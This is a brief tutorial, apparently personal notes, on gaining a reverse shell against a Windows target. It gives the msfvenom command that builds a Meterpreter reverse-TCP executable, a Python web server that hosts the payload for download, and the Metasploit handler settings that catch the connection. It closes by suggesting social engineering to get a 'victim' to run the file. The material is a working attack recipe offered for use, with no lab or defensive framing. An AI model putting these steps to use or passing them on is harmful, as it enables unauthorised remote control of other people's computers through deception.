(Firstly, in Kali Linux you have to open terminal and create an payload that will provide the reverse shell:)
1 - Open terminal and run the following:

msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.0 LPORT=443 -f exe -o /home/kali/Desktop/rs_exploitl.exe

#choose the ".exe" file name, creation directory, the LHOST and LPORT of your choice, but remember: if the attacker machine are in a cloud-based environment or in an external network, you have to set the LHOST as it's Public IP address. Ensure that the port are open in order to the exploit work.

(Now you have to create a micro webserver in Python that will be the website where the target will access and download your payload:)
2 - In the same directory where the payload was created, type:

python3 -m http.server 80
 
 #Now, if victm access via bowser the public or private IP of the attacker machine, it will be able to download you payload.
 
 
 (Now, you have to access Metasploit Framework in order to set the exploit:)
 3 - Type Msfconsole, and when the Metasploit Framework are initiated, type the following:

use exploit/multi/handler

then, type: set payload windows/meterpreter/reverse_tcp
            set LPORT 443
            set LHOST 10.10.10.0 #choose the local IP, even if you're using cloud-based environment or remote network#
            exploit
(Now you have only to wait the victm download and execute your payload in order to you gain the reverse shell. You can use Social Engineering tatics to achieve this :) )
